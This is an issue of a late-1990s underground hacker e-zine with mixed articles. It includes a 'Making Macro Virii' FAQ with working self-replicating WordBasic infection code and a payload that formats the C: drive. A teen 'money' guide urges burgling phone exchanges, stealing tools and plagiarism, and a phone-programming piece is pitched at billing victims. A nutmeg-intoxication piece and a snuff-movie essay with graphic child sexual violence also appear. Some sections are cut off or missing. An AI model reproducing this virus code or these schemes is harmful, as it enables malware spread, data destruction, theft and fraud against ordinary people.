<*> You are reading the third issue of Underground Periodical. For
those of you that didn't already know Up is an e-zine for people who
are living on the new edge, surfing along the new wave of radical
thought. You may notice that this issue is a little different from the
others, by that I mean there is views on certain issues instead of just
all technical information. We'd like to thank GPF#2 for designing the
new ascii logo.

<*> People have been having more and more download problems. It seems
that half the people who go to our site can't download the zips. While
some people can ok, others can't. It became such a dominant problem
that we ended up moving the files to ecad.org. The HTML is still hosted
at the 8m.com relay but the zips are linked from ecad.org. You can also
visit the ecad website for the latest in security news and its up
folder for tar files if you are a Unix user. It has been drawn to my
attention that some people can't access the website through a proxy
server so the whole website may be moved shortly. If we do suddenly
disappear and you're not sure where to get the issues subscribe to us
or e-mail us asking for directions through cyberspace.

<*> You may recall that last month due to high demand we started up a
subscription list. Well if you don't want to join it by going to the
bottom of our website and enter your e-mail in the dialog box you can
now sign up by e-mailing underground-periodical-subscribe@egroups.com
So what are you waiting for? Someone to hold your hand perhaps? Go
subscribe now!

<*> One advantage of being a subscriber is that you will receive the
soon to come Up Newsletter. The purpose of this newsletter is to keep
people informed on new projects open to the public and to request
general opinions on topics that might be raised in an article for
future issues. The deadline is not strict but about every month or so
is right. This newsletter will headed by my buddy CrossFire but other
staff members will help out.

<*> We'd like to thank any and all people who submitted to Issue 3 or
contributed in any way. It is understood that they are automatically
praised and worshipped above any gods. Without continued support from
the underground community we won't be able to keep Up going. It's your
magazine, so help it out a little. Anyway, on with this issue...

                       :.Nutmeg Hallucinations.:
                       :.::.::.By Franco.::.::.:

<*> Nutmeg, what the hell is it, is it a drug, is it addictive? I will
answer all these questions. Nutmeg, the long criticised hallucinogenic.
If you look it up, and I mean look it up in loads of dictionaries, many
will be associate with addictive drugs to which it is not! Yes, Nutmeg
is in no way ADDICTIVE!!! Below is an extract from a dictionary,
explaining about nutmeg.

+ MACMILLAN DICTIONARY OF TOXICOLOGY:
 
  myristicin

    A naturally occurring methylenedioxyphenyl compound found in
    nutmeg. It has been suggested that myristicin may be
    responsible, in whole or in part, for the toxicity of nutmeg.
    The spice (5-15g) causes symptoms similar to atropine
    poisoning: flushing of skin, tachycardia, and absence of
    salivation, and excitation of the central nervous system.
    Euphoria and hallucinations have given rise to abuse of this
    material. As a methylenedioxyphenyl compound, myristicin
    gives rise to a type III spectrum with reduced cytochrome
    

+ INTERNATIONAL DICTIONARY OF MEDICINE AND BIOLOGY
 
  myristicin
 
    A toxic, crystalline, safrole derivative present in star
  anise, parsley seed oil, and nutmeg oil. When ingested in
  large quantities, it can cause convulsions, hallucinations,
  tachycardia, and possibly death.

<*>-----------------------------------------------------------------<*>

Yes, it can result in death, and I don't honestly know the amount!
WARNING, CAN CAUSE DEATH IF CONSUMED IN LARGE ENOUGH QUANTITES!
BUMMERBUMMERBUMMERBUMMERBUMMERBUMMERBUMMERBUMMERRBUMMER!

<*>-----------------------------------------------------------------<*>

Now to sum up, the actual nutmeg drug is the volatile oil distilled
from it. It is a colourless, pale yellow or pale green liquid with the
same colour and taste of nutmeg. Blah, Blah, Blah bit... It is
available as East Indian nutmeg oil and West Indian nutmeg oil. East
Indian oil is soluble 1 in 3 of alcohol (90%), West Indian 1 in 4.

What follows is a short extract from one person's experience with
nutmeg. Yes, this is quite a popular account which has been read by
many people on the internet.

"""""""""The preceding narrative was given spontaneously by an
intelligent, perceptive, and sensitive adolescent who had had prior
experience with marijuana and morning-glory seeds. The frequent
connection of the two is known. (3, 5) He felt that on marijuana, the
predominant feeling was one of enjoyment and happiness, of being liked
and floating. Hallucinations were less marked. On morning-glory seeds,
he also had a light, floating sensation, but it seemed to be of a
different kind, and the most marked thing was a constant feeling of
euphoria. On both these substances, he felt he never really left
reality, and he thought that this was a major distinction between these
substances and nutmeg. He repeated his experience with nutmeg in a
smaller dose. On one tablespoon full of the substance he "felt high" or
sometimes "weird" but without hallucinations; music sounded better
although it did not sound louder. None of the colourful changes in
perception occurred on the small dose of nutmeg.

The description given by this patient is richer and more colourful than
the previous reports (3,6,7). Although the previous descriptions also
contained many of the experiences reported here, such as lapses of
attention, although consciousness was retained, (6) depersonalisation,
(6) bright colours, (3) a floating feeling, (3) and music being more
enjoyable. (3) Follow-up on this patient showed that he continued
taking marijuana but stopped taking nutmeg. Psychodynamically, the
patient was in the midst of an identity crisis, trying to deal with his
leanings toward dependency and passivity by identifying with the hippie
groups. The patient's father had been incapacitated for several years
because of psychiatric difficulties also centring around dependency
and passivity."""""""""

Scary, darey! There ya go, take enough nutmeg and you're away for a
long time with one of the *best* trips your probably ever experience in
your entire life from a non-addictive drug. Once again, I must warn
that in large enough quantities it can kill so be wise. My own view on
the drug is that its fantastic for hallucinating, but I wouldn't take
the stuff unsupervised, or without a friend to help stop me from doing
harm to my self. Though the best bit I believe to be is that you can't
get addicted to the stuff and it is because of that, that I would
choose this drug over and over instead of jabbing a vein and becoming
addicted to what not.

<*> <space filler>

The first file in this mini series has been published in issue 14
of the Swateam e-zine ( http://www.swateam.org ), however the esteemed
Cyborg asked if I could write a couple of files for his mag, and so
here I am. I welcome any kind of correspondence, whether it be good or
bad so give me a mail at sunburst@which.net, my icq no. is 34865702
and I am usually on #2600-uk on Effnet. Ok, I'll stop waffling and get
down to the task at hand.

</space filler>

Being a teenager myself I can't help but feel proud of the reputation
that we are given by the modern media, and out of determination not to
let the trouser-wetting bumbling bureaucrats down, I am releasing a
series of text files on well maximising life as a teenager. They are in
no particular order at the moment, maybe later on I might actually
create a webpage and host them. But until then I'll just submit them to
any h/p/a e-zine that wants it.

All teenagers share two common problems... lack of money and too much
schoolwork.

Schoolwork is the easiest thing to get rid off (by schoolwork I mean
essays and shit), just hop over to a cheating site like
http://www.school-sucks.com, or do a search in altavista. Find the
essay that you need and then cut and paste into your essay. Voila! Be
careful though, if your not that great at a particular subject and then
you go and hand in a 'A*' essay the teacher might get slightly curious
;) Keep on doing this and a large portion of your school work will be
done for you without you having to do a thing, that wasn't so hard was
it :)

There are plenty of methods of acquiring cash for the modern teenager,
you just have to know where to look. 

I'll start with the legal methods. I offer a legitimate computer
support service where I will go round and fix computer-related
problems. I basically charge a flat rate of £7.50, and seeing that most
problems will only involve formatting the hard drive or reinstalling
Windows, its v. good pay.

I am thinking about setting up my own computer building company, where
I will by the parts by bulk and then sell whole systems. I will need to
raise about £1500 in cash first though :/

Now I'll move on to the quicker, easier, enjoyable and illegal ways of
making money. Remember kiddies I accept no responsibility for any
trouble you may land yourself up in.

By now you should have heard about VMB systems, most of you reading
this will have their own box, yes? How hard was it to get your box? Not
very hard was it? Got the default passcode for the empty boxes? Ever
thought about selling these boxes to less knowledgeable teenagers? Try
it, it'll make you a quick buck. If you don't know what a VMB is mail
me and I'll point you in the right direction, and if I'm feeling nice I
might even give you a number.

A red box is another device that every aspiring phreak should have. I
suspect that most of you just use a dictaphone, its quite hard to sell
a tape with a couple of tones on for any decent money so I suggest you
seek out some schematics and build your own from scratch. After a quick
demonstration in a phone box these will sell like hot cakes, the price
that you want to sell them at depends on the cost of the components,
they vary so look around for a cheap supplier.

A visit into your local exchange (with the help of a sledge hammer :)
will usually give you some telco manuals, monologues (line monitoring
equipment) and if your lucky a lineman's handset. These are worth about
£40, so sell them quick. Remember that exchanges have silent alarms and
are linked up to the local police station, so don't spend longer than
two minutes in there.

Rummaging through the bins of electrical companies will often present
you with useful electrical equipment, you have to really live in a city
the reap the full rewards of this though. However country boys such as
myself can still hit lucky sometimes, the odd 286 etc.

Hanging around building sites is hardly trashing but you will often
find power drills, spades etc just left lying around. Liberate them!

<shameless sales plug>

On a recent adventure I found 25 power cables with EU connectors, these
can be rewired by simply chopping the tops off and putting British
plugs on. If you're interested mail me.

</shameless sales plug>    

If you're not looking for any money, and just want a way to waste some
time. Go with a friend to a building site, farm etc or anywhere where
there will be workmen hanging around. Shout some abuse at them, the odd
stone helps, and they will soon start to chase you. This is an
excellent way of keeping fit and healthy.

Well that's about all I've got time for, so wait with eager
anticipation for my next instalment.

Seeya,
Sunburst

P.s If any of you have got any spare telco manuals I will happily buy
them off you.

<*> Pirate Radio Series Part III

Introduction: This file deals with starting your own pirate radio
station. It is a part three of a four part series on pirate radio.
I've researched many sites on the internet combined with my own
knowledge to write this file.

More On Transmitters

 - Circuit Board Schematics

This file contains information about building small radio transmitters,
most of which have a range of about 30 yards or so. I found these HTML
diagrams on a Dutch pirate radio website and spent hours translating
them into text diagrams as best I could. This is not for the beginner
as you will have to interpret and construct these circuit boards on
your own. If you are unsure about what you are doing then stop now.

By the way, the text diagrams use some non-standard ascii characters.
As you won't find all of them on your keyboard be picky as to what text
editor you should decide to use. This file was written in the Fixedsys
font and is thereby most accurately read in it.

1) Transmitter using RF. This is probably the simplest transmitter that
you will find anywhere.

                      from one end.

2) Oscillator using BC237. Output around 50 mW. This layout came from
Radio Power from Leidschendam. In the early days of the 80's it was a
hobby of many amateurs to build oscillators with off-the-shelf parts,
this ended in this schematic. Note that * = Turns DIA 10mm.

#####
Intro
#####

<*> It seems that lately, the new buzzword round the net is internet
radio. All the hacker sites seem to have them, and even e-zines have
shows. This article will explain the basics of internet radio, and how
to get involved.

##########
The Basics
##########

There are generally two options in internet broadcasting, format wise -
Real Audio, or MP3. The Most popular option is Real Audio, simply
because this a very small codec and can be streamed very easily. When
the net started, the only kind of sounds generally suitable for
broadcasting were *very* small .wav files recorded at a shit sample
rate, resulting at short, very poor quality shows. Real Audio works by
streaming, downloading only the part of the file needed. Thus you end
up with extremely small download sizes, and a great base for internet
radio. Now on to MP3, many people are failing to realise that mp3 is
just a file format, not a Godzilla lookalike bent on destroying the
music industry as we know it. The reason that mp3 is so popular is it's
small file sizes - mp3 uses a codec where instead of writing guitar3,
guitar3, guitar3, it would be guitar3x3, and you can guess the
compression ratio of that then! 

################
Getting Involved
################

Ok, so now you want to start your own internet radio station, here's
how: first, obviously, record your show. You can record this to any
format you want, because whichever broadcast format you choose, you
will encode it. However, I would recommend that you record to .wav
format, seeing as that it is universally recognised. Now, once you have
recorded the show, its on with the encoding.

Encoding to Real Audio

Ok, the first thing you will need - obviously, is the real audio
encoder, this will give you a wizard to encode the file, I am not going
to tell you how to encode it. If you want to broadcast this live, you
get an option at the end of the wizard to broadcast this live.
Otherwise, Upload the RM file at the end to your website, then create a
text file with the location of the .rm file in, e.g.:

http://www.yourserver.com/somefile.rm

and upload that to the server, save it as 1.ram or something similar,
as long as it has the .ram suffix. Now on the page you want to
broadcast from, create a link to the ram file you uploaded, and voila,
if a visitor to your webpage clicks on that link, providing they have
the real audio player, they will hear the broadcast.

Encoding to MP3

Believe it or not, MP3 can be streamed, just create a file with the
location of your mp3 file in, e.g.:

http://www.someserver.com/babyonemoretime.mp3

and save it as whatever.m3u . Upload both of the files to your webpage,
and link to the .m3u file from your page, voila, you have a streaming
mp3. I am not going to go into detail on the mp3 subject, you should
know how to encode one by now, and if you don't, tough shit.

                       :..Cannabis Discussion..:
                       :.::...By Darkflame..::.:

<*> A topic on which many people hold strong views is the legalisation 
of the drug Cannabis. I will write about the arguments for and against
the proposition that Cannabis should be legalised.

There is a difference between legalisation and decriminalisation. The
decriminalisation of cannabis involves freeing the drug user/possessor
from criminal status, and limits the punishment for drug possession
(under a certain amount) to a minimal fine. This file is however, on
the complete legalisation of cannabis, which is the argument that
cannabis could be manufactured marketed and distributed in the same way
as alcohol and tobacco. It would be taxed and the price of cannabis
would depend on the price outlined by the government and eventually set
by the retailer.

The main argument used by the people who want the drug legalised is
that it is what is known as a "gateway" drug. Cannabis is said to lead
users of it onto harder and more harmful drugs. According to a United
States Government website:

"Long-term studies of high school students and their patterns of 
drug use show that very few young people use other illegal drugs 
without first trying marijuana."

It could however be argued that this has been worded in a manipulative
way, it could be argued that this is like saying that very few
alcoholics did not start by drinking beer before drinking spirits, and
beer is not criminalised.

Those who want the drug legalised argue that there would be great 
economic and environmental benefits of the drug being legalised. They 
say the  potential of cannabis plants for paper production is enormous.
According to the US Dept. of Agriculture, one acre of the cannabis
plant "Cannabis Sativa" can produce four times more paper than one acre
of trees. All types of paper products can be produced from cannabis
plants: newsprint, computer paper, stationary, cardboard, envelopes and
toilet paper. They say that trees must grow for 20 to 50 years after
planting before they can be harvested for commercial use. Within four
months after it is planted, Cannabis Sativa grows 10 to 20 feet tall
and it is ready for harvesting.

Cannabis can be grown on most farmland in warm climates, and in
greenhouses etc. Forests require large tracts of land available in few
locations. Substituting cannabis for trees would save forests and
wildlife habitats and would eliminate erosion of topsoil due to
logging. Reduction of topsoil erosion would also reduce pollution of 
lakes/rivers/streams. If the growth of Cannabis was taxed then there 
would be more money for the government, which would go back into 
society as a whole.

On the other hand, cannabis was banned in the first place (in the US 
at least) because it was giving too much competition to the US' timber
trade, and would have put many out of work. 

Those who are in favour of the drug remaining criminalised argue 
that smoking Cannabis is extremely bad for your health. When smoked in
a pipe or joint cannabis is eight times worse for your body than the
effects of tobacco products.

Those who are in favour of the drug being legalised argue that there 
are other ways of taking cannabis which are not as bad for your body, 
and that it is the tobacco used in smoking with a pipe that makes it 
worse, because the tobacco is combined with the cannabis. They argue 
that there are 460,000 deaths per annum that are connected with either
tobacco or alcohol, whereas there has never been a death as the direct
result of the use of cannabis. On the other hand cannabis does give
you the following ailments: 

 (1) problems with memory and learning;
 (2) distorted perception (sights, sounds, time, touch);
 (3) trouble with thinking and problem-solving;
 (4) loss of co-ordination; and
 (5) increased heart rate, anxiety.

Those against argue that these effects are even greater when other 
drugs are mixed with the cannabis; and users do not always know what 
drugs are given to them. 

While those who would like the drug legalised argue that the police 
could spend more time cracking down on these other drugs instead of 
spending time and resources on prosecuting those who use cannabis. 
They also say that if cannabis was properly marketed and manufactured,
people would know exactly what they were getting, and marketing would
be controlled. 

Those against the proposal say that if one person becomes addicted 
to a harder drug, and then is killed, that it is not worth the 
legalisation of cannabis. On the other hand, if they really want the 
drug, they will get it anyway. 

I, personally, think that the drug "Cannabis Sativa" should be
legalised for medicinal purposes. I think it should be distributed at 
the Doctor's discretion as he knows his patients the best, and he 
knows if they would need it. I think the only people who should be
given cannabis are those who have a chronic illness or are suffering
from deep depression. I'm not sure if I think cannabis should be
legalised out right, but I definitely think it should be given a fair
hearing by all governments.

NEC P400 and 600:
*****************

Well the issue before last I did a file on the NEC P800 mobile phone
and this time I am going to give an in-depth look at programming your
NEC p400 and p600. I don't know if also works with the p800 but try it
anyway. One of the best things that can be done is to intercept calls
to a certain mobile phone (e.g.: your friends, foe or enemy) and call
all of your mates which in turn would run the target's bill through the
roof! Good if you really hate the guy, but it can also be a nice little
trick for whatever you want.

It's also good if like me you have a phone dial lock on the phone at
home and you want to take the time to go and fuck up your neighbours
phone and start dialling all the internet access you want for the next
decade and the best thing is that they can only trace you back to the
original owners phone so you walk down the street laughing at the poor
sucker handing over their month wages to pick up your phone bill. But
if get caught you will be flooding one hell of a bill providing you
actually did run up their sorry ass.

Personal File Disclaimer:

Another thing is that by no means am I saying that you must do this,
this file is just a way I know that will make the average human have a
big smile on their face!

<*>-----------------------------------------------------------------<*>

These handsets are quad NAM handheld units and they run at the ESN 
prefix of 135 decimal & 87 hex. To do this programming you will need
a NEC programming adapter and converter cables, these must be used to
program these units. They are available from any good electronics shop
and other places. Just go looking.
        
NAM programing:
***************

1.  When the power is off, connect the NEC programing adaptor and
    cable.

2.  Turn the unit to power-on.

3.  Press RCL # 0 1 to enter test mode.

3.  Press RCL # 7 1 to enter programing mode.

4.  Press # to increment and store each step.

5.  At any time press and hold CLR to return to test mode, press 
    RCL # 0 2 to complete and exit programing.

                       :..Snuff Movie Culture..:
                       :..::.:.By Cyborg.:.::..:

<*> Lights, camera, action... from the upper echelons of the Hollywood
party crowd to the violent neo nazi culture of eastern Europe to the
urban underground market place on the streets of Thailand, snuff movies
are all around us. Hidden deep in the murky depths of pornucopia.
Everything has a dark underside, and although pornography is the
sinister shadow of the mainstream movie business it too has a distorted
mirror image. Snuff is infamous as the depth of human depravity.

For people who don't know what a snuff movie is allow me to enlighten
you. Snuff is more than murder caught on videotape (which is commonly
referred to as mondo films) two other decisive factors are necessary.
The first is that the primary motivation for the murder is production
value, this means organised and intentional, at a point in the script
the director has decided that somebody is killed. The second and most
important is that the footage is being distributed commercially.

The big question surrounding snuff movies is whether they actually
exist or not. Some say they are just urban legends. This is based on
the old cliche that you don't believe what you don't see. No law
enforcement authority has ever seized an actual real tape despite
offered rewards of $25,000 no questions asked. Seeing as how I am here
to bring you my views on the subject I would have to say that I think
yes they do exist. Although I have never seen one I don't feel that
ignorance will solve such a problem. People have to be open to the fact
that they might exist however unpleasant that may be.

Just where do people buy snuff movies? If you are wondering where you
can get one then you are a sick asshole. It is generally thought that
they are obtained, if you know who to ask, on the streets of New York.
Another hotspot would be the black market in Bangkok. Advertisements
have been found on street walls before. Here is an example:

"The film that could only be made in South America...
 where life is CHEAP!"

Hard hitting stuff... this statement was taken from an advertisement
for a snuff movie made in South America. The poster which displays
a drawing cut up into four pieces. The drawing depicts a naked woman
arching her head back as if screaming in agony and there is blood
spilled over the drawing. Self portrayed as "the bloodiest thing that
ever happened in front of a camera" I can only look on it in disgust.
Here is an account from I got from the internet describing one person's
tale of the existence of snuff movies:

"I have some limited information you may find of interest.  I have
traveled extensively around the world, living on 3 continents. As such
I have the found out some things. I understand most real snuff films
are primarily made in South America, especially Columbia. Thailand
produces a lot of real snuff films and while I lived in Bangkok I heard
from Thai friends that snuff films are readily available. There are
underground snuff bars in Bangkok. I had a friend who was offered a
video tape of a six year old boy being fucked to death, by the owner of
the resort bungalow he was renting. My Taiwanese friends claim to have
watched Japanese snuff films.

Supposedly, in the late 80's in Japan there was a serial killer who
would kidnap women and disembowel them on video, which he then sent to
the police to taunt them with. I have seen many Japanese Faces of Death
type of movies. They were much more graphic and real than the original
faces of death films. The Japanese films really made me ill. As you
know, there are no restrictions on film violence in Japan. Go to a
Japanese store and rent the video, or order the films online from Japan
if you are interested. Just remember, life is really cheap in some 3rd
world hellhole. If you want someone killed in the 3rd world it can be
done for a few hundred bucks or less, How much more do you think a real
snuff film would cost then? Snuff is real, just don't look for it in
the good old USA."  

When did the trend of snuff movies actually start? If you are a fan of
violence you will have heard of Manson. Charles Manson and his cohorts
were a violent cult. They brutally murdered the actress Sharon Tate and
many of her friends. They also murdered Roman Polanski's heavily
pregnant wife. Books spawned from the international media frenzy at the
time suggested that the Manson cult actually taped the murdered and
either sold them on or buried them underground. The author Ed Sanders
coined a phrase to describe this, he called it snuff.

I think it is now time I described my knowledge of snuff. I have this
friend. I'm not going to mention any names. He has another friend and
she knows this guy who has been known to locate certain items. It was
said that in one of these movies a women was naked, strapped to a table
bent over backwards, tied helplessly. She was too stoned to realise
what was going on when a bull charges at her and she died when the
bull's horn went up into her anus at galloping speeds. As readers may
have noticed I have not (and do not intend to) reveal my location.
However, in the city that I live I know people who have seen
advertisements for snuff movies in the alleyways of the city centre.

The reason I got interested in this topic is due to the new film by
A-list movie director Joel Schumacer, 8mm. In 8mm, Nicholas Cage plays
a private eye employed by an elderly widow to investigate a small reel
of film she has found in the personal possessions of her recently
deceased husband. The footage seems to show a young girl being tortured
and killed in a sado-masochistic ritual. Here is a quote from the film:

"The girl's like a rag doll, face reddened, eyes closed, but she
remains upright. Masked Man uses his thumbs to open her unseeing eyes.
He touches her mouth with his fingers, presses his lips to hers. Then,
Masked Man backs away, leaving frame, till the camera moves to find him
standing at a table with three large bowie knives laid out. Masked Man
runs his fingers over the blades..."

People who read this file might be curious... but the truly sick thing
about snuff movie is that by watching or buying one you are encouraging
murder as that is why the movie was filmed in the first place. Spare
a thought for the victims of such perversion. So what sort of people
ending up being cut up on screen for the pleasure of hardcore perverts
and serial rapists? The answer is homeless people, kids who run away
from home. Remember being a kid and when your parents told you never to
accept sweets from strangers you'd just laugh it off? It doesn't have
quite the same humorous edge now.

There will always be burned bodies of street children found in cellars
and children that go missing never to be found. In some parts of South
America it is still legal to kill your wife if she insults you. When
you talk about snuff Sao Paulo gets mentioned. Columbia besides being
famous for drugs, mobs, gambling and more of the same which did present
the Unabomber with so many viable options, guess what else goes on?
More than just snuff movies but violent cults which are rumored to
involve Columbian politicians. One guy posted a message on the
internet saying that the president of Columbia might be in on it,
nobody was ever sure whether he was joking or not...

As many people who study violent behaviour patterns will know, many
types and motives of violence are cross linked. For instance, some
modern nazi syndicates make snuff movies not for profit but to glorify
their execution of black, Asian, homosexual or any other types of
people who don't fit right into their 'Aryan paradise'. I don't have
enough space to elaborate on my portrayal of modern naziesque rage. I
know that even a file on nazism in America would take up too much space
likewise for my conclusions regarding fascist propaganda but watch this
space.

Unfortunatley, however much the people despise snuff the masses enjoy
the same thing only fictionalised. Remember how entertained you were
when you watched "The Silence Of The Lambs"? Hannibal Lector is a 90's
popular culture icon and, although it is bloodcurlingly intense to even
suggest, he is also a role model for gothic klans who film the twisted
consequences of the sick state of today's society. Remember that no
matter how secure you feel in your pretty boy lifestyle these are the
dark ages of global civilisation.

The question that you have to ask yourself is does this turn you on
even a little bit? When you think of a girl having her throat cut
during sex does that excite you at all? I think it is something
everyone needs to explore in their own mind. It is generally thought
that this applies to somewhere in the midst of ten per cent of people.
That is a lot of people. Contrary to wishful thinking this concerns
more than just wierdos who are widely regarded as insane this affects a
lot more... what about your friend? what about your neighbour? what
about yourself?

The glaring lack of hard evidence has never been enough has never been
enough to stop any supposing because there is always going to be myths
and rumors to fan the flames. Turning this theory on its head for a
moment, there is no evidence to suggest that they don't exist which by
logical terms means it could be 50/50 going either way. This goes
beyond the thinking that anything is possible because I don't think
that it is hard to believe. Since the birth of cinematography could
somebody have sold on footage of a killing? Maybe, but one vital
element is always missing - the tape itself.

Making Macro Virii - Another FAQ

[1] - Theory
[2] - Infection
[3] - A Simple Example

Firstly there are a few things you should know:

1. I am not teaching Word Basic ! I am showing you macro virii
   techniques.
2. I assume you know Basic/WordBasic or are able to comprehend it.
3. I personally assume no responsibility for incidents relating
   indirectly/directly to this article.
4. Most of the techniques shown will be picked up by Av scanners, so
   you will have to use farily complicated techniques to avoid
   detection. (Anti Heuristic)
   
Warning !
Backup all found copies of "NORMAL.DOT" - I mean it!
Believe me. You WON'T REGRET IT !

If you don't yet have an understanding of Basic do so. I will be using
WordBasic (6.0) Not VBA ('97) as I understand it, and it's easier to
make. So if you have 97 look up "equivilant commands" in the VBA help
file.

[1] - Theory

Macros Can only exist in templates. There are two types of templates ;
User templates (Where Macros are reffered to by "Filename:MacroName")
And the global template (This is the Normal.dot file, and macros are
reffered to by "Global:MacroName").

[2] - Infection

A general example: An infected template (passing as a document) is
opened in Word. The viral macro runs every time a document is opened
(Macro Name is "AutoOpen"). So the virus gets executed either when the
infected file is opened or a new clean file is opened. So the macro
checks to see whether it is to infect the global template (Infected
file opened) or it is already in the global template (and has to infect
clean file). It then infects the file, by converting the file into a
template (If neccesary.) and copies itself into the clean file.

[3] - A Simple Example

This is a bog standard virus using many general techniques i.e it is
based on the many virii Macro :

AutoOpen

'This means that the Macro runs 
'every time a file is opened

Sub Main
On Error Resume Next

'If theres an error, carry on wih the next command

File$=FileName$()+":"+"AutoOpen"

'The active file, Either the Infected document
' (template), Or a clean file or a file thats
' already been infected, Plus the macro name

Global$="Global"+":"+"AutoOpen"
macrocount = countmacros(0, 0)

'Find Out the number of macros

for i = 1 to macrocount

'Search through every macro

if macroname$(i, 0, 0) = "AutoOpen" then

'And if AutoOpen Is there

installed = - 1

'We're infected

End if

Next
If installed=-1 then 'The global template is

'infected so We have to copy the macro from 
'the global template to The new File
'But First, we make sure the clean files a 
'template Spread the virus

FileSaveAs .Format = 1
MacroCopy Global$,File$

'And Copy the Macro

Else 'Its Global Infection Time !
MacroCopy File$,Global$
Endif

END Sub

learned.

[5] - More Macro Names

Macro names can be special , so it runs at a certain time, and these
are them:

Auto Open  : Whenever a file is opened
Auto New   : Whenever a file is created
Auto Close : Whenever a file is closed

And Now , the menu-macros
FileSave    : When the user selects Save from the file menu.
FileSaveAs  : When the user selects SaveAs from the file menu.
ToolsMacro  : When the user selects Macro... from the tools menu

By now you should have got the idea.

[6] - Infecting With FileSave(As)

When You go into Tools|Macro And create a macro called FileSave, it'll
look like this (I hope).

   Sub MAIN
   Dim dlg As FileSave
   GetCurValues dlg
   Dialog dlg
   FileSave dlg
   End Sub

Now If we want to infect the file, we're going to have to copy our
macros:

   Sub MAIN
   Dim dlg As FileSave
   GetCurValues dlg
   Dialog dlg
   'Do The Dialog
   MacroCopy "Global:FileSave", WindowName$() + ":FileSave", 1
   MacroCopy "Global:AutoOpen", WindowName$() + ":AutoOpen", 1
   'Copy this macro and another,and make it run only
   Dlg.Format = 1
   FileSaveAs dlg
   'Do the file Saveas!
   End Sub

Understand yet ? What we do is let them choose the file, then copy the
macro into it.

And now FileSaveAs

   Sub MAIN
   Dim dlg As FileSaveAs
   GetCurValues dlg
   Dialog dlg
   FileSaveAs dlg
   End Sub

And the evil FileSaveAs

   Sub MAIN
   Dim dlg As FileSaveAs
   GetCurValues dlg
   Dialog dlg
   'do the Dialog
   If (Dlg.Format = 0) Or (Dlg.Format = 1) Then
   'If the dumbss is ssaving it as a template or a 
   'Word Document
   MacroCopy "FileSaveAs", WindowName$() + ":FileSaveAs", 1
   MacroCopy "AutoOpen", WindowName$() + ":AutoOpen", 1
   'Copy the Macros!
   Dlg.Format = 1
   End If
   FileSaveAs dlg
   End Sub
   
By now you will have a viral macro (almost) which infects When you open
a document. Or use the FileSaveAs or FileSave commands. Although apart
from the obvious fact that some of the macros dont copy all three viral
macros, there is NO PAYLOAD!!

[7] - Payloads : The Best Part Of A Macro

For those without viral knowledge, a payload is the part of the macro
that causes damage. Like in wazzu , it randomly puts words in other
places then it might put "wazzu " in the documents.

A virus is only as good as its payload !
 + Dos commands
 > For Dos Commands LIke Dir /ogne/b >>list.txt
 > Use this format which I nicked from formatC trojan
 > sCmd$ = "dir /ogne/b >> list.txt"
 > Shell Environnement$("COMSPEC") + "/c " + sCmd$, 0
 > To format C: use "echo y | format c:/u/v:foo>nul"
 > i think :) tesdt this with "echo y | pause" or 
 > and check the error level use choice
 
+ Debug fun
  When you want to drop a real virus you generally
  to use debug, but there is another method.
  This is the revamped code from the Nuclear Virus
  which uses only one batch file:

 > VER$ = GetSystemInfo$(24)
 > If VER$ = "4.0" Then
 >   ChDefaultDir "C:\WINDOWS\COMMAND", 5
 > ' find Debug
 > Else
 >   ChDefaultDir "C:\DOS", 5
 > End If   
 > Open "DEBUG.EXE" For Input As #1     
 > 'And check its a home
 > Close #1                    
 > Open "c:\ph33r.bat" For Output As #1

  in a file, perhaps encrypted.

                       :..::.:.By Cyborg.:.::..:

<*> Communist China. Ouch. Riddled with corrupt agendas and humans
rights abuses eastern civilisation leaves a lot to be desired. China
hasn't always been a favourite country for freedom fighters. However,
in recent times oppression does not always come in identifyable forms,
for you see there is a digital cloud forming over the ancient society.

A new construction has been put in place to repel invaders and protect
Chinese citizens from their foreign ideas. Dubbed "The Great Firewall"
it is a series of online blocks and filters installed into ISPs, Net
Cafes, Networks, Schools and anywhere else that it is possible. This
sickens me. Don't get me wrong. I have no problem with Marxist views,
in fact I greatly admire the ideology of socialism, but communism need
not entail the strict censorship and totalitarian regime which the
Chinese government enforce.

But it doesn't have to end like that. There is an online rebellion
taking place. Rage against the system. Hackers in every sense of the
word have already found ways around this intrusion. They refer to
themselves hacktivists, it an amalgamation on the words hack and
activists. They have defaced government websites and torn down
firewalls. It must be hard for them to crack the passwd files because
not many people have a Chinese wordlist :P.

I felt proud when I heard that. Finally the scene is going somewhere.
Everyone knows that the hacker community has evolved in a bad way, some
dude in an IRC channel needs to know how to use netbus, fuck that. The
modern age debate is whether or not it is immoral to harm or destroy
the information infrastructures of another country. Now as this is a
sensitive topic I must outline my views very clearly. I do NOT agree
with tearing down networks or aborting net service but I feel that
uploading a protest to a government website acceptable. I also gladly
encourage those who spread and upload 'unwelcome' information. Even
though hacking is not usually thought of in terms of extending free
speech it is vital in this case.

All the major hacking groups such as Chaos Computer Club, 2600, l0pht,
cDc and more have signed a pact denouncing the activities of LoU
(Legions of the Underground). I must strongly disagree with some but
not all of this statement. What LoU did was upload protests over human
rights abuses to Chinese governmental web sites. For that I applaud
them. However, declaring war on all their computers systems sounds
like another Clinton solution. We shouldn't try to attack them into
submitting but rather try to make them see what they are doing is
wrong and not acceptable in the eyes of the world.

I have heard of other groups rising up and vowing to become part of the
online revolution but so far they are immersed in the planning stage. I
wish them all the luck in the world. Hacktivists are the children of a
revolution and people who say that hacking countries who execute and
mistreat their citizens is immoral probably go home to their rich,
comfortable lifestyles and ponder some more about their almighty
ethics.

Although I don't agree with the groups who signed the pact I do
understand why they signed it. The US are a world power and many
innocent people have perished to satisfy 'the pursuit of happiness'.
President Clinton can't be having people stopping his flow of extra
pocket money. If you don't know what I'm talking about think back to
two years ago when they uncovered yet another White House scam. It
seems Mr. Clinton was being paid by Chinese businessmen to pose for
photographs. Now having products endorsed by one of the most powerful
men in the world is a sure seller for any product.

The Great Firewall is not the only immoral attempt of regulating the
internet to 'protect' Chinese citizens from Western influence. The
Chinese president Jiang Zemin has issued a sort of cyber police state
on the internet to patrol/monitor China based public IRC channels and
newsgroups. A warning has been issued to all online artists and
programmers which goes something along the lines of "Don't fuck with
China". It seems we would be well advised to challenge this authority
or face a censored world.

Wait, it gets worse, the People's Liberation Army in Shenyang are
conducting tests on virus warfare. This is just wrong. When world
powers start screwing around with virii guess who's going to be
engulfed in the crossfire... people like you and me.

In China hackers are executed for breaking into banks and ordinary
hackers are imprisoned for lesser crimes. Kevin Mitnick can thank his
lucky stars he's not living in a 'socialist paradise'. I hear the jail
cells in China are less than enticing...

<*> UK Boxing Part I -The Beige Box-.

Introduction: This file deals with some of the ways a beige box can be
              constructed and used. This is a simple but rewarding box.
              There are many other texts available on this subject, so
